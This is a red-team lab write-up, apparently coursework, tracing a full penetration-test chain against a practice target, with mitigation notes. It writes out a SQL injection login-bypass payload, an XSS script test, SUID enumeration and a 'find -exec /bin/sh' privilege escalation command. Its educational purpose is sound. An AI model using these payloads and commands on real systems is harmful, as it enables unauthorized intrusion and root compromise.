# Lab 9 - Full Attack Scenario (End-to-End)

> Lab Type: Red Team / Full Penetration Testing Lifecycle

## Objective
The objective of this lab is to simulate a full penetration testing scenario, starting from reconnaissance to exploitation and privilege escalation, demonstrating a complete attack workflow.

## Lab Environment
- Attacker Machine: Kali Linux
- Target: Vulnerable machine (e.g., DVWA / TryHackMe / local VM)
- Network: Controlled lab environment

## Tools Used
- Nmap
- Gobuster
- Web Browser
- Burp Suite
- Linux Terminal

## Background
A real-world penetration test involves multiple stages, including reconnaissance, scanning, vulnerability discovery, exploitation, and privilege escalation. This lab combines all previous techniques into one complete attack scenario.

---

## Attack Phases

### 1. Reconnaissance (Network Scan)

```bash
nmap -sS -sV <target-ip>
```

- Identified open ports and services:
  - 22 (SSH)
  - 80 (HTTP)

---

### 2. Directory Enumeration

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

- Discovered hidden paths:
  - /admin
  - /login
  - /uploads

---

### 3. Vulnerability Identification
- Focused on login page
- Tested for input validation weaknesses

---

### 4. Exploitation (SQL Injection)

Payload used:

```
' OR 1=1 --
```

- Successfully bypassed authentication
- Gained access to the system

---

### 5. XSS Testing

```html
<script>alert('XSS')</script>
```

- Confirmed script execution in browser

---

### 6. Intercept and Modify Request (Burp Suite)
- Captured login request
- Modified parameters before sending
- Observed application behavior changes

---

### 7. Privilege Escalation

```bash
find / -perm -4000 2>/dev/null
```

- Identified SUID binaries

```bash
find . -exec /bin/sh \; -quit
```

- Escalated privileges

---

### 8. Verify Access

```bash
whoami
```

- Confirmed root-level access

---

## Result
- Successfully performed full attack chain:
  - Reconnaissance
  - Enumeration
  - Exploitation
  - Privilege escalation

- Achieved full system access

---

## Analysis
- Weak input validation enabled SQL Injection
- Poor access control exposed sensitive directories
- Misconfigured SUID binaries allowed privilege escalation
- Lack of security monitoring increased risk

---

## Impact
- Full system compromise
- Unauthorized access to sensitive data
- Ability to control system operations

---

## Key Takeaways
- Real attacks involve multiple stages
- Small vulnerabilities can lead to full compromise
- Combining techniques increases attack effectiveness
- Security must be applied at every layer

---

## Mitigation
- Implement input validation and sanitization
- Secure authentication mechanisms
- Restrict directory access
- Remove unnecessary SUID permissions
- Monitor logs and implement detection systems

---

## Notes
This lab was conducted in a controlled environment for educational purposes only.
